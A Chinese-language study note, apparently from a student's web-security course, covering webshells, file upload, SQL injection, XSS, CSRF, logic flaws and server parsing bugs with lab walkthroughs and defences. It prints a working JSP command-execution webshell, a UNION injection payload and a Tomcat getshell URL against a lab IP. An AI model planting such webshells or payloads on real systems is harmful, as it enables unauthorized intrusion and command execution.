# Web应用安全

## 1. web安全基础

什么是web应用？——提供web服务的应用系统，通俗的讲就是一个网站

**web 分为服务端和客户端**

![image-20220524091023150](web应用安全.assets/image-20220524091023150.png)

**Web应用服务器如何处理请求？**

客户端➡http请求报文➡Apache➡根目录检索➡http相应报文➡客户端



**什么是静态网页？**——以`.htm \ .html`为后缀的文件，通常由HTML+CSS+JavaScript构成

**什么是渲染解析**——源代码➡网页

**动态网页**——以`.php\.jsp\.asp\.aspx`为后缀的文件，内容由HTML+CSS+JavaScript+后端代码构成



**动态网页请求服务器**

![image-20220524091914124](web应用安全.assets/image-20220524091914124.png)

php代码只做业务逻辑上的处理，数据最终被存储在数据库中。如果代码中涉及到对数据库的操作，脚本引擎会请求数据库进行操作。



**常见架构**

| 操作系统      | Web应用服务器 | 动态脚本引擎 | 数据库服务 |
| ------------- | ------------- | ------------ | ---------- |
| Windows       | IIS           | ASP（.NET）  | SQL Server |
| Windows/Linux | Apache        | PHP          | MySQL      |
| Windows/Linux | Tomcat        | Jsp          | Oracle     |

## 2.常用的Web渗透工具

-  Firefox浏览器
  - hackbar
  - cookie_edit
  - proxy
- BurpSuite——http的请求拦截和修改，扫描web应用程序漏洞，暴力破解登录单。

## 3.Web的常见漏洞利用与防护

- 输入输出验证不充分
- 设计缺陷
- 环境缺陷

### 3.1 WebShell 和WebShell管理工具

WebShell —— 网页后门，是运行在Web应用之上的远程控制程序。实质上是一张网页，由php Jsp等语言开发，一般具有**文件管理、端口扫描、提权、获取系统信息**等功能



WebShell管理工具 ——蚁剑



#### 一句话木马（复现）

在如下目录下添加文件

![image-20220524110621791](web应用安全.assets/image-20220524110621791.png)

然后利用hackbar发送命令得到版本信息

![image-20220524112515364](web应用安全.assets/image-20220524112515364.png)

我们再让它输出一句hello world，也成功执行

![image-20220524112703994](web应用安全.assets/image-20220524112703994.png)



### 3.2 文件上传漏洞原理和利用方式

**原理** ——假设文件上传功能没有对上传文件进行限制，可以上传能被服务端解析的文件，并通过此文件获得执行服务端命令的能力（WebShell）



**场景**——后台弱口令+文件上传漏洞



**防御方法：**

- 检测文件类型，大小，后缀。
- 最小权限运行Web服务
- 上传文件目录修改权限，不给上传文件执行权限，读写权限分离
- 安装WAF，安全狗，阿里云盾



**复现**

拿到环境

![image-20220527125712815](web应用安全.assets/image-20220527125712815.png)



用60102端口进入——这个107是之前做的

![image-20220524153146845](web应用安全.assets/image-20220524153146845.png)

发现一个文件上传点

![image-20220524153256232](web应用安全.assets/image-20220524153256232.png)

![image-20220524160926487](web应用安全.assets/image-20220524160926487.png)

上传一句话木马并抓包，找到上传的数据包，并找到路径

![image-20220527130853303](web应用安全.assets/image-20220527130853303.png)

之后复制路径拼接成url，输入命令查看php版本（注：X要和php代码里面的参数一致）

![image-20220527131552339](web应用安全.assets/image-20220527131552339.png)

copy连接到蚁剑中，然后设置密码（上文的X）

![image-20220527131818132](web应用安全.assets/image-20220527131818132.png)

然后添加

![image-20220527131924155](web应用安全.assets/image-20220527131924155.png)

之后可以打开终端

![image-20220527131950972](web应用安全.assets/image-20220527131950972.png)

然后查看文件

![image-20220527132133962](web应用安全.assets/image-20220527132133962.png)

### 3.3 任意文件下载漏洞

**原理**——没有对下载的文件类型、目录做合理的过滤，导致任意文件下载



危害：可以下载站点源码、系统配置文件等



**防御**：

- 下载路径不可控
- 根据ID下载
- 对参数进行严格过滤，不能进行目录遍历

### 3.4 SQL注入

**原理**——在输入的字符串之中注入SQL指令，数据库服务器会误认为是正常的SQL指令而运行。



联合注入，输出字段数需要和前一个语句一样

`select * from zgyz where student_name = '`+`'union select 0,1,2,3';`



MySQL 5.0 版本以上自带一个数据库：`information_schema`，该数据库存放了这个MySQL所有数据库和数据表的元信息。

**防御**——SQL语句预编译、选择足够严格的过滤机制



### 3.5 XSS漏洞原理及利用方式

什么是**JavaScript**——脚本语言，可以使网页拥有交互能力。

**XSS** —— 跨站脚本攻击，攻击者在页面插入恶意脚本代码

**原理**——实质是HTML注入，用户的输入被当作HTML代码执行

- 反射型XSS —— 非持久，主要存在于URL地址栏和搜索框，主要用于钓鱼
- 存储型XSS —— 将用户输入的数据存储在服务端（留言板、发帖、回帖）

**危害**：

- 钓鱼
- cookie
- 获取IP
- 重定向



### 3.6 CSRF漏洞原理及利用方式

**CSRF**——跨站请求伪造 ：利用未失效的会话信息，伪装目标用户发起请求执行目标网站接口。在受害者不知情的情况下，以受害者名义伪造请求发送给攻击站点。



CSRF危害：

- 以别人的名义发邮件
- 盗取账号
- 购买商品，虚拟货币转账
- 

**防御**

- Samesite Cookie
- 验证 HTTP Referer 字段
- 增加Token验证

**复现：**

先将下载好的环境放入phpstudy www目录

然后将PHP study版本切换为Nginx +php7.2.10nts

![image-20220527142743161](web应用安全.assets/image-20220527142743161.png)



访问安装页面进行安装

![image-20220527142956962](web应用安全.assets/image-20220527142956962.png)



配置个人信息

![image-20220527145220258](web应用安全.assets/image-20220527145220258.png)

登录后台测试一下

![image-20220527151734688](web应用安全.assets/image-20220527151734688.png)



设置会员价格

![image-20220527152805340](web应用安全.assets/image-20220527152805340.png)

然后用查看拦截到的HTTP数据包

![image-20220527152919355](web应用安全.assets/image-20220527152919355.png)

创建一个靶机的环境

![image-20220527153237532](web应用安全.assets/image-20220527153237532.png)

用SSH连接

![image-20220527153417882](web应用安全.assets/image-20220527153417882.png)



之后编写一个index.html(burpsuit 出了点小意外，卡了太久了先搁置)

```html

```





### 3.7 逻辑漏洞



危害：

- 大量敏感数据泄露，越权访问
- 商品低价支付



安装环境后登陆网站后台

![image-20220527184543374](web应用安全.assets/image-20220527184543374.png)

然后到首页访问会员中心

![image-20220527184803361](web应用安全.assets/image-20220527184803361.png)

看到账户还有100元

开启burpsuite抓包，然后把一个MacBook加入购物车，抓到包之后，把加入购物车的数量改成-10

![image-20220527190134139](web应用安全.assets/image-20220527190134139.png)

然后发送，可以看到已经被修改

![image-20220527190237732](web应用安全.assets/image-20220527190237732.png)

结算之后查看金额，very rich

![image-20220527191109220](web应用安全.assets/image-20220527191109220.png)

### 3.8 RCE漏洞

**RCE** —— 远程命令/代码执行漏洞



### 3.9  Apache Http多后缀解析漏洞

用户配置不当造成的漏洞

先拿到实验环境

![image-20220527191844715](web应用安全.assets/image-20220527191844715.png)

然后拿浏览器访问一下











### 3.10 IIS常见漏洞



**IIS解析漏洞**——影响版本 IIS 5.x -> 6.0 

利用方式：

- 该解析漏洞 `;`后面的后缀不会解析
- shell.asp;.jpg



### 3.11 Nginx解析漏洞

用户配置不当造成



### 3.12 Tomcat 后台弱口令&&get shell

搭建环境

![image-20220527213735194](web应用安全.assets/image-20220527213735194.png)

访问，登录

![image-20220527213722663](web应用安全.assets/image-20220527213722663.png)

用msf 攻击

![image-20220527214616760](web应用安全.assets/image-20220527214616760.png)



![image-20220527214629920](web应用安全.assets/image-20220527214629920.png)

拿到账号和密码

![image-20220527214712534](web应用安全.assets/image-20220527214712534.png)

写一个jsp

```jsp
<%
  if("x".equals(request.getParameter("pwd")))
  {
      java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
      int a = -1;
      byte[] b = new byte[2048];
      out.print("<pre>");
      while((a = in.read(b))!=-1)
      {
          out.println(new String(b));
      }
      out.print("</pre>");
      
  }
%>
```

![image-20220527220806628](web应用安全.assets/image-20220527220806628.png)

把jsp压缩成zip再把后缀改为war上传

之后访问

`http://183.129.189.61:60103/shell/shell.jsp?pwd=x&i=uname%20-a`

![image-20220527221613394](web应用安全.assets/image-20220527221613394.png)























































